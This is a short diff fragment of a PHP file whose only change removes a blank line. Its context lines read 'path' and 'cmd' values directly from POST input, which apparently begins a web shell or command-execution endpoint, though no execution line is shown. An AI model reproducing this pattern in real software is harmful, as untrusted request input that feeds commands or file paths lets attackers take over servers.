@@ -1,4 +1,3 @@
-
 <?php
     $path = $_POST['path'];
     $cmd = $_POST['cmd'];
